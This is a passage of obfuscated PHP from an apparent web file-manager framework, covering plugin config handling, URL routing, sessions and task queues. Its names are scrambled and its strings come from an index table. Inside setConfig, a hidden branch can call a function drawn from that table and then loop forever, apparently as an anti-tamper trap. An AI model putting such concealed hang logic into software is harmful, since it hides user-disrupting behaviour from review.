Hook::trigger($Û†æ¹äÊ[1558], $‚±ØŸ±¨); if ($Ëíæ®™Õ && is_array($Ëíæ®™Õ)) { $‚±ØŸ±¨ = $Ëíæ®™Õ; } $this->packageData = $‚±ØŸ±¨; return $‚±ØŸ±¨; } public function packageInfoGet($íı¿ĞÜ¶) { $ÌçªÂÍÑ = $this->appPackage(); return array_get_value($ÌçªÂÍÑ, $íı¿ĞÜ¶); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ïëó©ÒÚ][1559]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ïëó©ÒÚ][1560]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ïëó©ÒÚ][1561]); } public function echoJsAssign($Ã×¥›, $ûè¸ÙæÅ) { $this->echoJsAssignArr[$Ã×¥›] = $ûè¸ÙæÅ; } private function parseFile($õ¶½ö—¢) { $ğï¦Ú¨ş =& $_SERVER[ïëó©ÒÚ]; $¹ÑÚñ„Ü = file_get_contents_nossl($õ¶½ö—¢); $¿íÎˆÏŸ = array($ğï¦Ú¨ş[1562], $ğï¦Ú¨ş[1563], $ğï¦Ú¨ş[1564], $ğï¦Ú¨ş[1565], $ğï¦Ú¨ş[1566], $ğï¦Ú¨ş[1567], $ğï¦Ú¨ş[1568]); $³¶œ‚›¦ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$ğï¦Ú¨ş[89]][$ğï¦Ú¨ş[1569]]); foreach ($this->echoJsAssignArr as $Éã Ÿ => $à²€ÉÑÏ) { $¿íÎˆÏŸ[] = $ğï¦Ú¨ş[1570] . $Éã Ÿ . $ğï¦Ú¨ş[1571]; $³¶œ‚›¦[] = is_array($à²€ÉÑÏ) || is_object($à²€ÉÑÏ) ? rawurlencode(json_encode($à²€ÉÑÏ)) : $à²€ÉÑÏ; } if (strstr($¹ÑÚñ„Ü, $ğï¦Ú¨ş[1572])) { $ËˆœÌÅÓ = rawurlencode(json_encode($this->pluginLangArr)); $¹ÑÚñ„Ü = str_replace($ğï¦Ú¨ş[1572], $ËˆœÌÅÓ, $¹ÑÚñ„Ü); } if (strstr($¹ÑÚñ„Ü, $ğï¦Ú¨ş[1573])) { $ËˆœÌÅÓ = $ËˆœÌÅÓ = rawurlencode(json_encode($this->getConfig())); $¹ÑÚñ„Ü = str_replace($ğï¦Ú¨ş[1573], $ËˆœÌÅÓ, $¹ÑÚñ„Ü); } $¹ÑÚñ„Ü = str_replace($¿íÎˆÏŸ, $³¶œ‚›¦, $¹ÑÚñ„Ü); return $¹ÑÚñ„Ü; } private function parseLang(&$÷¿ı”çù) { $×Ú£ëÓì =& $_SERVER[ïëó©ÒÚ]; $éÒµñå¢ = $×Ú£ëÓì[1574]; if (!strstr($÷¿ı”çù, $éÒµñå¢)) { return; } preg_match_all($×Ú£ëÓì[1575], $÷¿ı”çù, $Şş€«Õ); if (!is_array($Şş€«Õ) || count($Şş€«Õ) == 0 || !is_array($Şş€«Õ[0]) || count($Şş€«Õ[0]) == 0) { return; } $à¼Œìğ“ = array(); $óÉÍ¢Ï = array(); foreach ($Şş€«Õ[0] as $ÖôÙçÍ“) { $•”†´¶À = substr($ÖôÙçÍ“, strlen($éÒµñå¢), -4); $æ—‹™ªĞ = LNG($•”†´¶À); $à¼Œìğ“[] = $ÖôÙçÍ“; $óÉÍ¢Ï[] = str_replace(array($×Ú£ëÓì[231], $×Ú£ëÓì[1081], $×Ú£ëÓì[342], $×Ú£ëÓì[118]), array($×Ú£ëÓì[53], $×Ú£ëÓì[53], $×Ú£ëÓì[12], $×Ú£ëÓì[1576]), $æ—‹™ªĞ); } $÷¿ı”çù = str_replace($à¼Œìğ“, $óÉÍ¢Ï, $÷¿ı”çù); } private function parseConfig(&$‘“úø‘) { $×Õ¶Ë’Ÿ =& $_SERVER[ïëó©ÒÚ]; $±áú™¥× = $×Õ¶Ë’Ÿ[1577]; if (!strstr($‘“úø‘, $±áú™¥×)) { return; } preg_match_all($×Õ¶Ë’Ÿ[1578], $‘“úø‘, $èƒÁ£­); if (!is_array($èƒÁ£­) || count($èƒÁ£­) == 0 || !is_array($èƒÁ£­[0]) || count($èƒÁ£­[0]) == 0) { return; } $˜¸øÉ‚Ò = $this->getConfig(); $êîíÑñ = array(); $àÃ–ÏÚÅ = array(); foreach ($èƒÁ£­[0] as $êÜº¢³¦) { $ˆà–•â¤ = substr($êÜº¢³¦, strlen($±áú™¥×), -2); $êîíÑñ[] = $êÜº¢³¦; $àÃ–ÏÚÅ[] = _get($˜¸øÉ‚Ò, $ˆà–•â¤); } $‘“úø‘ = str_replace($êîíÑñ, $àÃ–ÏÚÅ, $‘“úø‘); } private function parsePackage(&$áè°‹â) { $È¨ëß×ù =& $_SERVER[ïëó©ÒÚ]; $ÈúÄ–´ = $È¨ëß×ù[1579]; if (!strstr($áè°‹â, $ÈúÄ–´)) { return; } preg_match_all($È¨ëß×ù[1580], $áè°‹â, $÷ ÷æï™); if (!is_array($÷ ÷æï™) || count($÷ ÷æï™) == 0 || !is_array($÷ ÷æï™[0]) || count($÷ ÷æï™[0]) == 0) { return; } $÷—Â¨Œø = $this->appPackage(); $“ø¸ÑÚ® = array(); $¸¶âŒ»Ò = array(); foreach ($÷ ÷æï™[0] as $ˆÀ¡ãì×) { $ÑËò”½í = substr($ˆÀ¡ãì×, strlen($ÈúÄ–´), -2); $“ø¸ÑÚ®[] = $ˆÀ¡ãì×; $¸¶âŒ»Ò[] = _get($÷—Â¨Œø, $ÑËò”½í); } $áè°‹â = str_replace($“ø¸ÑÚ®, $¸¶âŒ»Ò, $áè°‹â); } final function echoFile($“ÙŒìÔê, $°ª¶ÂÙ³ = false) { $¬ùæäìÑ =& $_SERVER[ïëó©ÒÚ]; $‡ÓâÇ¦ñ = $this->pluginPath . $“ÙŒìÔê; if (ACT == $¬ùæäìÑ[1581]) { echo $¬ùæäìÑ[1582] . $this->pluginName . $¬ùæäìÑ[8] . $“ÙŒìÔê . $¬ùæäìÑ[1583]; if (!file_exists($‡ÓâÇ¦ñ)) { echo $¬ùæäìÑ[1584]; return; } } $óğ×™¶® = $this->parseFile($‡ÓâÇ¦ñ); $this->parseLang($óğ×™¶®); $this->parseConfig($óğ×™¶®); $this->parsePackage($óğ×™¶®); if (is_array($°ª¶ÂÙ³)) { $óğ×™¶® = str_replace(array_keys($°ª¶ÂÙ³), array_values($°ª¶ÂÙ³), $óğ×™¶®); } echo $¬ùæäìÑ[231] . $óğ×™¶®; } final function initLang() { $–›–àÂå =& $_SERVER[ïëó©ÒÚ]; $«·˜Ù§É = $–›–àÂå[1585]; $ĞÀßæ¯Í = $this->pluginPath . $–›–àÂå[1586]; $ºö…·Ü‡ = I18n::getType(); $ğ¸åã¦³ = array(); if (file_exists($ĞÀßæ¯Í . $ºö…·Ü‡ . $–›–àÂå[848])) { $ğ¸åã¦³ = (include $ĞÀßæ¯Í . $ºö…·Ü‡ . $–›–àÂå[848]); } else { if ($ºö…·Ü‡ == $–›–àÂå[1587] && !file_exists($ĞÀßæ¯Í . $ºö…·Ü‡ . $–›–àÂå[848]) && file_exists($ĞÀßæ¯Í . $–›–àÂå[1588])) { $ğ¸åã¦³ = (include $ĞÀßæ¯Í . $–›–àÂå[1588]); } else { if (file_exists($ĞÀßæ¯Í . $«·˜Ù§É . $–›–àÂå[848])) { $ğ¸åã¦³ = (include $ĞÀßæ¯Í . $«·˜Ù§É . $–›–àÂå[848]); } } } if (!is_array($ğ¸åã¦³)) { return array(); } if (@count($ğ¸åã¦³) > 0) { I18n::set($ğ¸åã¦³); } return $ğ¸åã¦³; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ê¬°‘‡ƒ) { $ıœ“’¾ =& $_SERVER[ïëó©ÒÚ]; if (!isset($_SERVER[$ıœ“’¾[400]]) || !isset($_SERVER[$ıœ“’¾[408]])) { $ä«şÛ…  = $ıœ“’¾[882]; $›µ›ÇìÆ = $ıœ“’¾[402]; $¤³Ç«”Í = $_SERVER[$ıœ“’¾[403]] . $ıœ“’¾[404]; $’°£Æüİ = $›µ›ÇìÆ($¤³Ç«”Í); $Ì¸¯ìÆŸ = explode($ıœ“’¾[231], $’°£Æüİ); if (count($Ì¸¯ìÆŸ) < $ıœ“’¾[631]) { $€Æµª† = $ıœ“’¾[406]; $€Æµª†(); } $ïŒëº¿¦ = $ıœ“’¾[883]; $ïŒëº¿¦($_SERVER[$ıœ“’¾[884]]); $«ğ¨ªšë = 1; for ($à¹ØƒÖ = $«ğ¨ªšë; $à¹ØƒÖ > 0; $à¹ØƒÖ++) { $ïŒëº¿¦ = json_encode($GLOBALS[$ıœ“’¾[427]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ê¬°‘‡ƒ); } public function onSetConfig($¼Â—¹½) { } public function onGetConfig($¨ˆï¹«ô) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Œ¢Õ¶Ï) { if ($Œ¢Õ¶Ï == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($™‹ÂôÒÔ = "\x70\x6c\165\x67\x69\x6e\101\x75\164\150") { $ñóíèƒ™ =& $_SERVER[ïëó©ÒÚ]; if (!defined($ñóíèƒ™[484])) { return !1; } if (_get($GLOBALS, $ñóíèƒ™[512])) { return !0; } $Òˆ½ÌÂÙ = $this->getConfig(); if (!$Òˆ½ÌÂÙ[$™‹ÂôÒÔ]) { return !1; } return ActionCall($ñóíèƒ™[1589], $Òˆ½ÌÂÙ[$™‹ÂôÒÔ]); } public function url($Ë¶»Ù¦, $êŸñÏÛò = '', $ß×¦‹ïó = true) { $¤Ìª¯¨† =& $_SERVER[ïëó©ÒÚ]; $ğ¢ìÑ¦Ê = $this->getConfig(); $ø€¾¦­” = KOD_VERSION . $¤Ìª¯¨†[10] . KOD_VERSION_BUILD; $åå­š„Ô = $this->packageVersion(); $†¡‹´Ãš = $ø€¾¦­” . $¤Ìª¯¨†[386] . $åå­š„Ô; if (substr($Ë¶»Ù¦, 0, 4) == $¤Ìª¯¨†[148] || substr($Ë¶»Ù¦, 0, 2) == $¤Ìª¯¨†[1370]) { $‚©ÙŒÅñ = $Ë¶»Ù¦ . $¤Ìª¯¨†[1590] . $†¡‹´Ãš; } else { if ($êŸñÏÛò == $¤Ìª¯¨†[12]) { $‚©ÙŒÅñ = $this->pluginHost . $Ë¶»Ù¦ . $¤Ìª¯¨†[1590] . $†¡‹´Ãš; } else { if ($êŸñÏÛò === $¤Ìª¯¨†[75]) { $‚©ÙŒÅñ = $this->pluginHost . $Ë¶»Ù¦; } else { if ($êŸñÏÛò == $¤Ìª¯¨†[1591]) { $‚©ÙŒÅñ = STATIC_PATH . $Ë¶»Ù¦ . $¤Ìª¯¨†[1590] . $ø€¾¦­”; } else { if ($êŸñÏÛò == $¤Ìª¯¨†[1592]) { $‚©ÙŒÅñ = APP_HOST . $¤Ìª¯¨†[1593] . $Ë¶»Ù¦ . $¤Ìª¯¨†[1590] . $ø€¾¦­”; } else { if (isset($ğ¢ìÑ¦Ê[$êŸñÏÛò])) { $‚©ÙŒÅñ = $ğ¢ìÑ¦Ê[$êŸñÏÛò] . $Ë¶»Ù¦ . $¤Ìª¯¨†[1590] . $†¡‹´Ãš; } } } } } } if (!$ß×¦‹ïó) { return $‚©ÙŒÅñ; } echo $‚©ÙŒÅñ; } public function link($ÒÖ¼®ù = false, $ô‡şœµ± = '') { $ŒÔ‰«’— =& $_SERVER[ïëó©ÒÚ]; if (!$ÒÖ¼®ù) { $this->link($ŒÔ‰«’—[1594], $ŒÔ‰«’—[1592]); $this->link($ŒÔ‰«’—[1595], $ŒÔ‰«’—[1591]); $this->link($ŒÔ‰«’—[1596], $ŒÔ‰«’—[1591]); $this->link($ŒÔ‰«’—[1597], $ŒÔ‰«’—[1591]); $this->link($ŒÔ‰«’—[1598], $ŒÔ‰«’—[1591]); return; } $á¬ á’¿ = $this->url($ÒÖ¼®ù, $ô‡şœµ±, !1); if (substr($ÒÖ¼®ù, -3) == $ŒÔ‰«’—[1599]) { echo $ŒÔ‰«’—[1600] . $á¬ á’¿ . $ŒÔ‰«’—[1601] . $ŒÔ‰«’—[231]; } else { if (substr($ÒÖ¼®ù, -4) == $ŒÔ‰«’—[1602]) { echo $ŒÔ‰«’—[1603] . $á¬ á’¿ . $ŒÔ‰«’—[1604] . $ŒÔ‰«’—[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\x5b\136\x2f\x5d\53", "\x3a\x6e\x75\x6d" => "\133\x30\55\x39\x5d\53", "\72\141\154\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ èğ²ú, $®ã»’•) { $™‘ˆ˜°€ =& $_SERVER[ïëó©ÒÚ]; if ($ èğ²ú == $™‘ˆ˜°€[1605]) { $šÌÉ‚Œª = array_map($™‘ˆ˜°€[1606], $®ã»’•[0]); $ã‰‡úš‰ = strpos($®ã»’•[1], $™‘ˆ˜°€[8]) === 0 ? $®ã»’•[1] : $™‘ˆ˜°€[8] . $®ã»’•[1]; $É£®¯ığ = $®ã»’•[2]; } else { $šÌÉ‚Œª = null; $ã‰‡úš‰ = strpos($®ã»’•[0], $™‘ˆ˜°€[8]) === 0 ? $®ã»’•[0] : $™‘ˆ˜°€[8] . $®ã»’•[0]; $É£®¯ığ = $®ã»’•[1]; } array_push(self::$maps, $šÌÉ‚Œª); array_push(self::$routes, $ã‰‡úš‰); array_push(self::$methods, strtoupper($ èğ²ú)); array_push(self::$callbacks, $É£®¯ığ); } public static function error($»µ†ê¾) { self::$errorCallback = $»µ†ê¾; } public static function haltOnMatch($™òï”ö€ = true) { self::$halts = $™òï”ö€; } public static function dispatch() { $Ÿ»ğïì =& $_SERVER[ïëó©ÒÚ]; $ß¸¼Åº‘ = parse_url($_SERVER[$Ÿ»ğïì[1607]], PHP_URL_PATH); $‡İé×  = $_SERVER[$Ÿ»ğïì[159]]; $ò ÉèÂ = array_keys(static::$patterns); $ŸÇáâá× = array_values(static::$patterns); $¿Óø©Éû = !1; self::$routes = preg_replace($Ÿ»ğïì[1272], $Ÿ»ğïì[8], self::$routes); if (in_array($ß¸¼Åº‘, self::$routes)) { $‚Ÿè†¬ = array_keys(self::$routes, $ß¸¼Åº‘); foreach ($‚Ÿè†¬ as $ÀéóÜ¢ú) { if (self::$methods[$ÀéóÜ¢ú] == $‡İé×  || self::$methods[$ÀéóÜ¢ú] == $Ÿ»ğïì[1608] || in_array($‡İé× , self::$maps[$ÀéóÜ¢ú])) { $¿Óø©Éû = !0; if (!is_object(self::$callbacks[$ÀéóÜ¢ú])) { $öĞ«ø° = explode($Ÿ»ğïì[8], self::$callbacks[$ÀéóÜ¢ú]); $İµáÛ© = end($öĞ«ø°); $¸¶«³Ç° = explode($Ÿ»ğïì[1609], $İµáÛ©); $İıÑò¾¹ = new $¸¶«³Ç°[0](); $İıÑò¾¹->{$¸¶«³Ç°[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ÀéóÜ¢ú]); if (self::$halts) { return; } } } } } else { $œï‹·ÂÒ = 0; foreach (self::$routes as $ÀéóÜ¢ú) { if (strpos($ÀéóÜ¢ú, $Ÿ»ğïì[4]) !== !1) { $ÀéóÜ¢ú = str_replace($ò ÉèÂ, $ŸÇáâá×, $ÀéóÜ¢ú); } if (preg_match($Ÿ»ğïì[1610] . $ÀéóÜ¢ú . $Ÿ»ğïì[1611], $ß¸¼Åº‘, $©½›¾Û)) { if (self::$methods[$œï‹·ÂÒ] == $‡İé×  || self::$methods[$œï‹·ÂÒ] == $Ÿ»ğïì[1608] || !empty(self::$maps[$œï‹·ÂÒ]) && in_array($‡İé× , self::$maps[$œï‹·ÂÒ])) { $¿Óø©Éû = !0; array_shift($©½›¾Û); if (!is_object(self::$callbacks[$œï‹·ÂÒ])) { $öĞ«ø° = explode($Ÿ»ğïì[8], self::$callbacks[$œï‹·ÂÒ]); $İµáÛ© = end($öĞ«ø°); $¸¶«³Ç° = explode($Ÿ»ğïì[1609], $İµáÛ©); $İıÑò¾¹ = new $¸¶«³Ç°[0](); if (!method_exists($İıÑò¾¹, $¸¶«³Ç°[1])) { echo $Ÿ»ğïì[1612]; } else { call_user_func_array(array($İıÑò¾¹, $¸¶«³Ç°[1]), $©½›¾Û); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$œï‹·ÂÒ], $©½›¾Û); if (self::$halts) { return; } } } } $œï‹·ÂÒ++; } } if ($¿Óø©Éû == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ñ°‹¶Ö‘ =& $_SERVER[ïëó©ÒÚ]; header($_SERVER[$ñ°‹¶Ö‘[1613]] . $ñ°‹¶Ö‘[1614]); echo $ñ°‹¶Ö‘[1615]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Ÿ»ğïì[1607]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $²Õ»ç§Æ =& $_SERVER[ïëó©ÒÚ]; static $ˆËœŸ¯º = false; if ($ˆËœŸ¯º) { return $ˆËœŸ¯º; } $ÏÑãÈ²Ğ = $GLOBALS[$²Õ»ç§Æ[6]][$²Õ»ç§Æ[349]]; self::$sessionTime = $ÏÑãÈ²Ğ[$²Õ»ç§Æ[1616]]; $¥‘ğ¦ú¾ = isset($GLOBALS[$²Õ»ç§Æ[1617]]) ? $GLOBALS[$²Õ»ç§Æ[1617]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¥‘ğ¦ú¾)) { self::$sessionSign = Cookie::get($¥‘ğ¦ú¾); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¥‘ğ¦ú¾, self::$sessionSign, self::$sessionTime); $©á¹şà = $ÏÑãÈ²Ğ[$²Õ»ç§Æ[1618]]; $Ãª¢ÕØ = $ÏÑãÈ²Ğ[$©á¹şà]; $Ã¨‘Œ©Ø = $ÏÑãÈ²Ğ[$²Õ»ç§Æ[838]]; switch ($©á¹şà) { case $²Õ»ç§Æ[21]: self::$handle = Model($²Õ»ç§Æ[839]); break; case $²Õ»ç§Æ[840]: self::$handle = new CacheRedis($Ãª¢ÕØ, $Ã¨‘Œ©Ø); break; case $²Õ»ç§Æ[841]: self::$handle = new CacheMemcached($Ãª¢ÕØ, $Ã¨‘Œ©Ø); break; case $²Õ»ç§Æ[199]: $Ãª¢ÕØ[$²Õ»ç§Æ[84]] = $Ãª¢ÕØ[$²Õ»ç§Æ[84]] . $²Õ»ç§Æ[1619]; self::$handle = new CacheFile($Ãª¢ÕØ, $Ã¨‘Œ©Ø); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ˆËœŸ¯º = new self(); return $ˆËœŸ¯º; } public static function getBySign($´Ô¼–õ) { CacheLock::lock($´Ô¼–õ); $â–Ô³Óß = self::$handle->get($´Ô¼–õ); CacheLock::unlock($´Ô¼–õ); $â–Ô³Óß = unserialize($â–Ô³Óß); return is_array($â–Ô³Óß) ? $â–Ô³Óß : array(); } public static function setBySign($ŞÈó–ËÌ, $şšÌÆá¡) { CacheLock::lock($ŞÈó–ËÌ); self::$handle->set($ŞÈó–ËÌ, serialize($şšÌÆá¡), self::$sessionTime); CacheLock::unlock($ŞÈó–ËÌ); } public static function sign($Öª¯‚Ü° = false) { $Öª¯‚Ü° && (self::$sessionSign = $Öª¯‚Ü°); self::init(); return self::$sessionSign; } public static function set($Ä§Ú×®ñ, $ú¡÷Õš  = false) { self::init(); if (is_array($Ä§Ú×®ñ)) { foreach ($Ä§Ú×®ñ as $ø¦ Ğ => $ú‚îê³ª) { array_set_value(self::$data, $ø¦ Ğ, $ú‚îê³ª); } } else { array_set_value(self::$data, $Ä§Ú×®ñ, $ú¡÷Õš ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($“‡ù°âÊ = false) { self::init(); if (!$“‡ù°âÊ) { return self::$data; } return array_get_value(self::$data, $“‡ù°âÊ); } public static function remove($­ßÚº¼Å) { self::init(); unset(self::$data[$­ßÚº¼Å]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ïëó©ÒÚ][843])) { self::$handle->clearTimeout(); } } } goto Aá´Ã‹æµ÷; a‘Û‚ƒôõù: class TaskHttp extends Task { protected function startAfter() { $µ‰ì‘óí =& $_SERVER[ïëó©ÒÚ]; $½ùÊ¬ =& $this->task; $½ùÊ¬[$µ‰ì‘óí[1736]] = 1; Hook::bind($µ‰ì‘óí[1704], array($this, $µ‰ì‘óí[1737])); Hook::bind($µ‰ì‘óí[1706], array($this, $µ‰ì‘óí[1738])); Hook::bind($µ‰ì‘óí[1708], array($this, $µ‰ì‘óí[1739])); } protected function endAfter() { $—óš“ô =& $_SERVER[ïëó©ÒÚ]; Hook::unbind($—óš“ô[1704], array($this, $—óš“ô[1737])); Hook::unbind($—óš“ô[1706], array($this, $—óš“ô[1738])); Hook::unbind($—óš“ô[1708], array($this, $—óš“ô[1739])); } public function progressStart($ŸìÍù¼î) { $¨ÍÃÂÈß =& $_SERVER[ïëó©ÒÚ]; $‹ŒôÌÍŒ = curl_getinfo($ŸìÍù¼î); self::log($¨ÍÃÂÈß[1740] . $‹ŒôÌÍŒ[$¨ÍÃÂÈß[307]]); self::valueSet($this->task[$¨ÍÃÂÈß[399]], $this->task); } public function progressEnd($¶ª×Úğñ) { $…€çıØ† =& $_SERVER[ïëó©ÒÚ]; self::log($…€çıØ†[1741] . $this->task[$…€çıØ†[399]]); $this->end(); } public function progress($–ÃÊÕÏª, $Ê¯¹³Ë, $¥‡Ãø“, $¹şüúÔ«, $¿¨×á•Æ) { $àúÚ— =& $_SERVER[ïëó©ÒÚ]; $•§Ç©±î =& $this->task; if ($¿¨×á•Æ > 0) { $•§Ç©±î[$àúÚ—[796]] = $•§Ç©±î[$àúÚ—[796]] == 0 ? $¹şüúÔ« : $•§Ç©±î[$àúÚ—[796]]; $•§Ç©±î[$àúÚ—[1662]] = $¿¨×á•Æ; } else { if ($¥‡Ãø“ > 0) { $•§Ç©±î[$àúÚ—[796]] = $•§Ç©±î[$àúÚ—[796]] == 0 ? $Ê¯¹³Ë : $•§Ç©±î[$àúÚ—[796]]; $•§Ç©±î[$àúÚ—[1662]] = $¥‡Ãø“; } } $this->update(); self::log("\160\x72\x6f\147\x72\145\x73\x73\x48\164\x74\160\x3a\x64\157\167\x6e\72{$¥‡Ãø“}\x2f{$Ê¯¹³Ë}\73\40\x75\160\x6c\x6f\x61\144\72{$¿¨×á•Æ}\x2f{$¹şüúÔ«}\x3b"); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\153\121\165\145\x75\145\114\145\156\147\164\150"; const QUEUE_DATA = "\164\x61\163\153\121\165\145\x75\145\x44\x61\164\x61"; public static $listData = false; public static function initTask() { } public static function add($¬Û©‚Ù¸, $Û±Ä–€ = array(), $™§¾Ùè£ = '', $¹«˜ä¤Ù = '') { $Ì©¿¿û =& $_SERVER[ïëó©ÒÚ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($¹«˜ä¤Ù && array_find_by_field(self::$listData, $Ì©¿¿û[94], $¹«˜ä¤Ù)) { return !0; } self::$listData[] = array($Ì©¿¿û[264] => $¬Û©‚Ù¸, $Ì©¿¿û[1742] => $Û±Ä–€, $Ì©¿¿û[462] => $™§¾Ùè£, $Ì©¿¿û[94] => $¹«˜ä¤Ù); return !0; } public static function addSubmit() { $­É”‘§ı =& $_SERVER[ïëó©ÒÚ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($­É”‘§ı[1743] . json_encode_force(array_to_keyvalue(self::$listData, $­É”‘§ı[12], $­É”‘§ı[462])), $­É”‘§ı[1744]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($’ë¥¡ Û, $¦šğ£€ = array(), $ğ²Š‡¤õ = '', $ì–š¶ˆ = '') { $Õ”§Ì×¥ =& $_SERVER[ïëó©ÒÚ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ÊşÏ¿ˆ“ = self::getAll(); if ($ì–š¶ˆ && array_find_by_field($ÊşÏ¿ˆ“, $Õ”§Ì×¥[94], $ì–š¶ˆ)) { return !0; } $ÊşÏ¿ˆ“[] = array($Õ”§Ì×¥[264] => $’ë¥¡ Û, $Õ”§Ì×¥[1742] => $¦šğ£€, $Õ”§Ì×¥[462] => $ğ²Š‡¤õ, $Õ”§Ì×¥[94] => $ì–š¶ˆ); write_log($Õ”§Ì×¥[1743] . $ğ²Š‡¤õ, $Õ”§Ì×¥[1744]); self::setAll($ÊşÏ¿ˆ“); return !0; } public static function run() { $¥¬Öİø­ =& $_SERVER[ïëó©ÒÚ]; $²…ïæ’Í = self::getAll(); $ÛÀ°ì´Ö = array_shift($²…ïæ’Í); if (!$ÛÀ°ì´Ö) { return !1; } self::setAll($²…ïæ’Í); $´÷ªÕ¥½ = timeFloat(); try { Hook::apply($ÛÀ°ì´Ö[$¥¬Öİø­[264]], $ÛÀ°ì´Ö[$¥¬Öİø­[1742]]); } catch (Exception $Ê§’ÖÕù) { } $›³Ú©ßé = number_format(timeFloat() - $´÷ªÕ¥½, 3) . $¥¬Öİø­[1677]; write_log($¥¬Öİø­[1745] . $ÛÀ°ì´Ö[$¥¬Öİø­[462]] . $¥¬Öİø­[1746] . $›³Ú©ßé, $¥¬Öİø­[1744]); return !0; } public static function count() { $¯€‡µÛÁ = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$¯€‡µÛÁ) { return 0; } return intval($¯€‡µÛÁ); } public static function getAll() { $ÅÙİ›½Ô = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$ÅÙİ›½Ô) { return array(); } return $ÅÙİ›½Ô; } public static function setAll($ÆØã†û•) { $©ÇÃú¤™ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($ÆØã†û•), $©ÇÃú¤™); Cache::set(self::QUEUE_DATA, $ÆØã†û•, $©ÇÃú¤™); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ºÂå¥‡¥, $Éè¤•¯ = 5.0) { if (!$ºÂå¥‡¥) { return; } $¼é¢‹Ø´ = Cache::get($ºÂå¥‡¥); if (!$¼é¢‹Ø´ || timeFloat() - floatVal($¼é¢‹Ø´) >= $Éè¤•¯) { Cache::set($ºÂå¥‡¥, timeFloat(), $Éè¤•¯ * 10); return !0; } return !1; } public static function timeLimitCall($ôØ´ë„Ï, $­½Õ¾ °, $Ó••ğà, $ºĞ”®î× = 5.0) { $ºí´ïÆÅ =& $_SERVER[ïëó©ÒÚ]; if (!$ôØ´ë„Ï || !$­½Õ¾ °) { return; } self::$asyncAdd = !0; $®ìÆ†‡ = $ºí´ïÆÅ[1747]; $‹äÁ”ë = Cache::get($®ìÆ†‡, !0); $¦²Óââ… = array($ºí´ïÆÅ[1748] => timeFloat(), $ºí´ïÆÅ[1749] => timeFloat(), $ºí´ïÆÅ[264] => $­½Õ¾ °, $ºí´ïÆÅ[1742] => $Ó••ğà, $ºí´ïÆÅ[203] => $ºĞ”®î×); if (is_array($‹äÁ”ë[$ôØ´ë„Ï])) { $¦²Óââ…[$ºí´ïÆÅ[1749]] = $‹äÁ”ë[$ôØ´ë„Ï][$ºí´ïÆÅ[1749]]; } if (is_array($‹äÁ”ë[$ôØ´ë„Ï])) { if (timeFloat() - $‹äÁ”ë[$ôØ´ë„Ï][$ºí´ïÆÅ[1748]] < $¦²Óââ…[$ºí´ïÆÅ[203]] * 0.3) { return; } $¦²Óââ…[$ºí´ïÆÅ[1749]] = $‹äÁ”ë[$ôØ´ë„Ï][$ºí´ïÆÅ[1749]]; } $‹äÁ”ë[$ôØ´ë„Ï] = $¦²Óââ…; Cache::set($®ìÆ†‡, $‹äÁ”ë, 60); Cache::removeMemory($®ìÆ†‡); write_log($ºí´ïÆÅ[1750] . $ôØ´ë„Ï . $ºí´ïÆÅ[71] . $­½Õ¾ °, $ºí´ïÆÅ[1744]); } public static function timeLimitCallLoop() { $ƒêš¿úÚ =& $_SERVER[ïëó©ÒÚ]; $İì®€½Ç = array($ƒêš¿úÚ[1751]); $˜ÒŞèŒ… = in_array(strtolower(ACTION), $İì®€½Ç); if (!$˜ÒŞèŒ… && !self::$asyncAdd) { return; } $É‰ûšÖŞ = $ƒêš¿úÚ[1747]; $âá–Äç› = Cache::get($É‰ûšÖŞ, !0); if (!$âá–Äç› || count($âá–Äç›) <= 0) { return; } $Â©«ÙÀ = !1; $›Œèñ = timeFloat(); $Ê‡¨ƒ•á = array(); foreach ($âá–Äç› as $ÖÕï×Ê¿ => $¯ˆõ÷õ§) { if ($›Œèñ - $¯ˆõ÷õ§[$ƒêš¿úÚ[1749]] > $¯ˆõ÷õ§[$ƒêš¿úÚ[203]]) { $Â©«ÙÀ = !0; try { Hook::apply($¯ˆõ÷õ§[$ƒêš¿úÚ[264]], $¯ˆõ÷õ§[$ƒêš¿úÚ[1742]]); 